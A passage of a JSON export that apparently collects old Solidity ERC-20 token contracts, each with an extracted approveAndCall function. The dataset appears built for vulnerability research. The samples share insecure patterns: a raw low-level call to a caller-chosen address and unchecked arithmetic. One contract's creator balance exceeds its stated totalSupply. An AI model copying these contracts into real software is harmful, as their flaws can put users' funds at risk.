    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb152d"
  },
  "filename": "33894.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract IssueSSSStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'S0.1';\n function IssueSSSStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb152e"
  },
  "filename": "33902.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract InitialToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function InitialToken(\n ) public {\n uint256 indexPrice=210000000*1000000000000000000;\n balances[msg.sender] = indexPrice;\n totalSupply = indexPrice;\n name = \"best0\";\n decimals = 18;\n symbol = \"bestOneTokenTest\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb152f"
  },
  "filename": "33903.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1530"
  },
  "filename": "33905.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1531"
  },
  "filename": "33916.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract NeoBankToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NeoBankToken(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"Bank of Neoxian\";\n decimals = 0;\n symbol = \"NEOBANK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1532"
  },
  "filename": "33920.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 20000000000000000000000000;\n totalSupply = 20000000000000000000000000;\n name = \"HunterCoin\";\n decimals = 18;\n symbol = \"HTC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1533"
  },
  "filename": "33921.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 8888888800000000;\n totalSupply = 8888888800000000;\n name = \"DojoCoin\";\n decimals = 8;\n symbol = \"DOJO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1534"
  },
  "filename": "33922.sol",
  "content": "pragma solidity ^0.4.0;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Ekrone is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Ekrone(\n ) {\n balances[msg.sender] = 84000000000;\n totalSupply = 84000000000;\n name = \"Ekrone\";\n decimals = 3;\n symbol = \"EKR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1535"
  },
  "filename": "33925.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RepublicofthePhilippinesToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function RepublicofthePhilippinesToken(\n ) {\n balances[msg.sender] = 100000000000000000;\n totalSupply = 1000000000;\n name = \"RepublicofthePhilippinesToken\";\n decimals = 8;\n symbol = \"RPT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1536"
  },
  "filename": "33927.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SikhCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SikhCoin\n () {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Sikh Coin\";\n decimals = 18;\n symbol = \"SIKH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1537"
  },
  "filename": "33928.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitcoinDiamond is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitcoinDiamond(\n ) {\n balances[msg.sender] = 300000000;\n totalSupply = 300000000;\n name = \"Bitcoin Diamond\";\n decimals = 2;\n symbol = \"BCD\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1538"
  },
  "filename": "33929.sol",
